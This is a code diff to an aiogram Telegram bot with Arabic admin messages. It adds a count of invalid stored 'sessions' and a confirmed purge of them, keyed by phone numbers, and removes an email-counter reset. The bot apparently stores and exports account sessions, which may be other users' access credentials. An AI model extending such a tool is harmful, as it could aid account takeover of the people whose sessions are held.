@@ -1,7 +1,10 @@
 import asyncio
 import logging
 from aiogram import Bot, Dispatcher, F
-from aiogram.types import Message, CallbackQuery, Contact, BufferedInputFile
+from aiogram.types import (
+    Message, CallbackQuery, Contact, BufferedInputFile,
+    InlineKeyboardMarkup, InlineKeyboardButton,
+)
 from aiogram.filters import CommandStart
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
@@ -134,11 +137,15 @@ async def _export_session_message(callback: CallbackQuery, session):
 
 async def _admin_panel_text(uid: int) -> str:
     count = await database.get_sessions_count(uid, SUPER_ADMIN_ID)
-    return (
-        f"👋 أهلاً بالقيادة!\n\n"
-        f"هذه الحسابات المتوفرة حالياً، عددهم: <b>{count}</b>"
-        + ADMIN_FOOTER
-    )
+    invalid = await database.count_invalid_sessions(uid, SUPER_ADMIN_ID)
+    lines = [
+        "👋 أهلاً بالقيادة!",
+        "",
+        f"✅ نشطة: <b>{count}</b>",
+    ]
+    if invalid:
+        lines.append(f"❌ غير صالحة (قابلة للحذف): <b>{invalid}</b>")
+    return "\n".join(lines) + ADMIN_FOOTER
 
 
 def h(text) -> str:
@@ -882,15 +889,61 @@ async def delete_single_session(callback: CallbackQuery):
 
 
 # ──────────────────────────────────────────
-# تصفير عداد العمليات
+# حذف الجلسات غير الصالحة
 # ──────────────────────────────────────────
-@dp.callback_query(F.data == "reset_mail_mem")
-async def reset_counter(callback: CallbackQuery):
+@dp.callback_query(F.data == "purge_invalid")
+async def purge_invalid_prompt(callback: CallbackQuery):
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
-    await database.reset_email_counter()
-    await callback.answer("✅ تم تصفير عداد العمليات بنجاح!", show_alert=True)
+    uid = callback.from_user.id
+    n = await database.count_invalid_sessions(uid, SUPER_ADMIN_ID)
+    if n == 0:
+        await callback.answer("📭 لا توجد جلسات غير صالحة.", show_alert=True)
+        return
+    await callback.message.edit_text(
+        f"⚠️ <b>حذف نهائي</b>\n\n"
+        f"سيتم حذف <b>{n}</b> جلسة غير صالحة من قاعدة البيانات.\n"
+        f"لا يمكن التراجع."
+        + ADMIN_FOOTER,
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [
+                InlineKeyboardButton(
+                    text="✅ تأكيد الحذف",
+                    callback_data="purge_invalid_yes",
+                ),
+                InlineKeyboardButton(
+                    text="❌ إلغاء",
+                    callback_data="back_to_sessions",
+                ),
+            ],
+        ]),
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "purge_invalid_yes")
+async def purge_invalid_confirm(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    uid = callback.from_user.id
+    phones = await database.purge_invalid_sessions(uid, SUPER_ADMIN_ID)
+    if not phones:
+        await callback.answer("📭 لا توجد جلسات للحذف.", show_alert=True)
+        return
+    sessions = await _sessions_for_admin(uid)
+    text = await _admin_panel_text(uid)
+    await callback.message.edit_text(
+        f"✅ تم حذف <b>{len(phones)}</b> جلسة غير صالحة."
+        + f"\n\n{text}",
+        reply_markup=sessions_keyboard(
+            sessions, is_super_admin=is_super_admin(uid)
+        ) if sessions else None,
+        parse_mode="HTML",
+    )
+    await callback.answer(f"✅ حُذفت {len(phones)} جلسة", show_alert=True)
 
 
 # ──────────────────────────────────────────
